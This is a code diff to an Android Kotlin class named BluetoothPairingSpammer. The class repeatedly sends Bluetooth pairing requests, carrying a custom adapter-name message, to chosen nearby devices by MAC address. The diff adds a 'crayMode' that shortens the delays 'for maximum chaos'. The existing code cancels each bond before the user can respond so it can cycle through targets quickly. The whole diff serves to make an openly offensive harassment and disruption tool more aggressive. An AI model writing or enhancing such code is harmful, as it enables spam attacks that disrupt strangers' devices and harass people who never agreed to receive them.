@@ -33,6 +33,8 @@ class BluetoothPairingSpammer {
         private const val TAG = "BtPairingSpam"
         private const val BOND_CYCLE_DELAY_MS = 800L
         private const val BOND_FIRE_DELAY_MS = 500L
+        private const val CRAY_CYCLE_DELAY_MS = 200L
+        private const val CRAY_FIRE_DELAY_MS = 150L
     }
 
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
@@ -53,6 +55,9 @@ class BluetoothPairingSpammer {
     private var bondReceiver: BroadcastReceiver? = null
     private var appContext: Context? = null
 
+    private var cycleDelay = BOND_CYCLE_DELAY_MS
+    private var fireDelay = BOND_FIRE_DELAY_MS
+
     /**
      * Start spamming pairing requests to the given target devices.
      *
@@ -60,13 +65,17 @@ class BluetoothPairingSpammer {
      * @param customName The message to display (becomes the BT adapter name)
      * @param targets Set of MAC addresses to spam
      * @param discoveredDevices Full list of discovered BluetoothDevice objects
+     * @param crayMode If true, uses turbo timing for maximum chaos
      */
     fun start(
         context: Context,
         customName: String,
         targets: Set<String>,
-        discoveredDevices: List<BluetoothDevice>
+        discoveredDevices: List<BluetoothDevice>,
+        crayMode: Boolean = false
     ) {
+        cycleDelay = if (crayMode) CRAY_CYCLE_DELAY_MS else BOND_CYCLE_DELAY_MS
+        fireDelay = if (crayMode) CRAY_FIRE_DELAY_MS else BOND_FIRE_DELAY_MS
         appContext = context.applicationContext
         _lastError.value = null
         _connectionAttempts.value = 0
@@ -123,7 +132,7 @@ class BluetoothPairingSpammer {
                     } catch (e: Exception) {
                         Log.w(TAG, "Pairing request to ${device.address} failed: ${e.message}")
                     }
-                    delay(BOND_CYCLE_DELAY_MS)
+                    delay(cycleDelay)
                 }
             }
         }
@@ -157,7 +166,7 @@ class BluetoothPairingSpammer {
 
             // Fire-and-forget: cancel bond after short delay so we don't wait
             // for user approval — allows fast iteration over a list of targets
-            delay(BOND_FIRE_DELAY_MS)
+            delay(fireDelay)
             cancelBond(device)
         } catch (e: SecurityException) {
             Log.w(TAG, "SecurityException sending pairing to $address", e)
